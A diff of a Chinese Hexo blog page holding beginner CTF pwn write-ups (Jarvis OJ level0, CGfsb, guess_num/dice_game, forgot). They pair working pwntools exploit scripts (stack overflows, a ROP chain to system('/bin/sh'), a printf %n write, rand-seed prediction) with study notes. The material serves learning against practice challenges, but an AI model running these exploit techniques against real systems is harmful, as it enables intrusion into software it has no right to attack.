@@ -3,21 +3,21 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>study</title>
+  <title>wolcome</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
-<meta property="og:title" content="study">
+<meta property="og:title" content="wolcome">
 <meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="study">
+<meta property="og:site_name" content="wolcome">
 <meta property="og:locale" content="default">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="study">
+<meta name="twitter:title" content="wolcome">
   
-    <link rel="alternative" href="/atom.xml" title="study" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="wolcome" type="application/atom+xml">
   
   
     <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
@@ -40,7 +40,7 @@
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
 			
-			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			<img lazy-src="/1.jpg" class="js-avatar">
 			
 		</a>
 
@@ -137,7 +137,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+				<img lazy-src="/1.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author">zzl</h1>
@@ -163,10 +163,10 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-level0" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-p" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/08/08/level0/" class="article-date">
+      <a href="/2019/08/08/p/" class="article-date">
   	<time datetime="2019-08-08T07:25:16.000Z" itemprop="datePublished">2019-08-08</time>
 </a>
     </div>
@@ -180,8 +180,8 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/level0/">
-        level0
+      <a class="article-title" href="/2019/08/08/p/">
+        drops做题收获
         
       </a>
     </h1>
@@ -194,56 +194,118 @@
       
         <a id="more"></a>
 
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img src="level0_/checksec.png" alt></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img src="level0_/z.png" alt></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img src="level0_/rop.png" alt></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+
+
+
+<p>攻防世界 </p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
+<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
+<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
+<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
+<p><strong>用法说明</strong></p>
+<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
+位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
+<p>一<br><img src="/2019/08/08/p/2.png" alt><br>利用%x泄露内容</p>
+<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
+<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
+<p>二<br><img src="/2019/08/08/p/1.jpg" alt><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
+<p>所以说偏移处指针会不会是指</p>
+<pre><code>猜测。。。。
+原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
+<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
+<pre><code> from pwn import *
+p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);
+
+pwnme=0x804a068
+p.recvuntil(&apos;name:&apos;)
+p.sendline(&apos;qqqq&apos;)
+p.recvuntil(&apos;please:&apos;)
+payload = p32(pwnme)
+payload += &apos;aaaa&apos;
+payload += &apos;%10$n&apos;
+p.sendline(payload)
+p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
+<p><img src="/2019/08/08/p/3.png" alt><img src="https://i.imgur.com/mSdA2Xf.png" alt></p>
+<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
+<p>但是区别在于</p>
 <p>一</p>
-<p>`</p>
+<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
+而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
+所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
+<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
+所以写脚本时
+guess_num用的是
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+而dice_game用的是
+libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
+<pre><code>srand初始化随机种子,rand产生随机数。
+随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
+实际上是一段数字的循环，这些数字取决于随机种子。
+在调用rand()函数时，必须先利用srand()设好随机数种子，
+如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
+<p>下面是从</p>
+<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
+<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
+即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。
+
+Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)
+
+Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
+<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
+<p>脚本</p>
+<pre><code>from pwn import *
+from ctypes import *
+#coding:utf-8
+p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+payload = &quot;a&quot;*0x20 +p64(1)
+p.recvuntil(&apos;Your name:&apos;)
+p.sendline(payload)
+libc.srand(1)
+for i in range(10):
+num = str(libc.rand()%6+1)
+p.recvuntil(&apos;number:&apos;)
+p.sendline(num)
+
+p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
+<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
+<p>记下函数的地址。</p>
+<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
+<p>搜到的题解</p>
+<pre><code>#! /usr/bin/env python
+from pwn import *
+p=remote(&apos;111.198.29.45&apos;,56015)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;A&apos;*32+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
+<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
+<p><img src="/2019/08/08/p/4.png" alt></p>
+<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
+<p><img src="/2019/08/08/p/5.png" alt></p>
+<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
+<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
+<p>为什么呢？<br>我也不太清楚。</p>
+<p>下面是为什么用32*”A”的原因</p>
+<p>重点</p>
+<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
+所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
+因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
+分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
+可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
+<p>因此我用下面的脚本验证发现也可行</p>
 <pre><code>#coding:utf-8
 from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
+
+p=remote(&apos;111.198.29.45&apos;,39341)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;9&apos;*36+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
 
       
     </div>
@@ -252,7 +314,7 @@ p.interactive()</code></pre><p>`</p>
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/level0做题收获/">level0做题收获</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/写的挺乱的，大家理解着看一下，讲的都是简单的。/">写的挺乱的，大家理解着看一下，讲的都是简单的。</a></li></ul>
 	</div>
 
       
@@ -436,10 +498,10 @@ for key in info:
 
 
   
-    <article id="post-p" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-level0" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/08/08/p/" class="article-date">
+      <a href="/2019/08/08/level0/" class="article-date">
   	<time datetime="2019-08-08T07:25:16.000Z" itemprop="datePublished">2019-08-08</time>
 </a>
     </div>
@@ -453,8 +515,8 @@ for key in info:
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/p/">
-        drops做题收获
+      <a class="article-title" href="/2019/08/08/level0/">
+        level0
         
       </a>
     </h1>
@@ -467,118 +529,56 @@ for key in info:
       
         <a id="more"></a>
 
-
-
-
-<p>攻防世界 </p>
-<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
-<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
-<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
-<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
-<p><strong>用法说明</strong></p>
-<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
-位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
-<p>一<br><img src="p/2.png" alt><br>利用%x泄露内容</p>
-<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
-<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
-<p>二<br><img src="p/1.jpg" alt><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
-<p>所以说偏移处指针会不会是指</p>
-<pre><code>猜测。。。。
-原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
-<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
-<pre><code> from pwn import *
-p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);
-
-pwnme=0x804a068
-p.recvuntil(&apos;name:&apos;)
-p.sendline(&apos;qqqq&apos;)
-p.recvuntil(&apos;please:&apos;)
-payload = p32(pwnme)
-payload += &apos;aaaa&apos;
-payload += &apos;%10$n&apos;
-p.sendline(payload)
-p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
-<p><img src="3.png" alt><img src="https://i.imgur.com/mSdA2Xf.png" alt></p>
-<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
-<p>但是区别在于</p>
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img src="/2019/08/08/level0/checksec.png" alt></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img src="/2019/08/08/level0/z.png" alt></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img src="/2019/08/08/level0/rop.png" alt></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
 <p>一</p>
-<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
-而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
-所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
-<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
-所以写脚本时
-guess_num用的是
-libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-而dice_game用的是
-libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
-<pre><code>srand初始化随机种子,rand产生随机数。
-随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
-实际上是一段数字的循环，这些数字取决于随机种子。
-在调用rand()函数时，必须先利用srand()设好随机数种子，
-如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
-<p>下面是从</p>
-<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
-<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
-即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。
-
-Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)
-
-Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
-<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
-<p>脚本</p>
-<pre><code>from pwn import *
-from ctypes import *
-#coding:utf-8
-p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
-libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-payload = &quot;a&quot;*0x20 +p64(1)
-p.recvuntil(&apos;Your name:&apos;)
-p.sendline(payload)
-libc.srand(1)
-for i in range(10):
-num = str(libc.rand()%6+1)
-p.recvuntil(&apos;number:&apos;)
-p.sendline(num)
-
-p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
-<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
-<p>记下函数的地址。</p>
-<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
-<p>搜到的题解</p>
-<pre><code>#! /usr/bin/env python
-from pwn import *
-p=remote(&apos;111.198.29.45&apos;,56015)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(&apos;A&apos;)
-payload=&apos;A&apos;*32+p32(0x080486cc)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(payload)
-print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
-<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
-<p><img src="p/4.png" alt></p>
-<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
-<p><img src="p/5.png" alt></p>
-<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
-<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
-<p>为什么呢？<br>我也不太清楚。</p>
-<p>下面是为什么用32*”A”的原因</p>
-<p>重点</p>
-<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
-所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
-因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
-分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
-可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
-<p>因此我用下面的脚本验证发现也可行</p>
+<p>`</p>
 <pre><code>#coding:utf-8
 from pwn import *
-
-p=remote(&apos;111.198.29.45&apos;,39341)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(&apos;A&apos;)
-payload=&apos;9&apos;*36+p32(0x080486cc)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(payload)
-print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
 
       
     </div>
@@ -587,7 +587,7 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/写的挺乱的，大家理解着看一下，讲的都是简单的。/">写的挺乱的，大家理解着看一下，讲的都是简单的。</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/level0做题收获/">level0做题收获</a></li></ul>
 	</div>
 
       
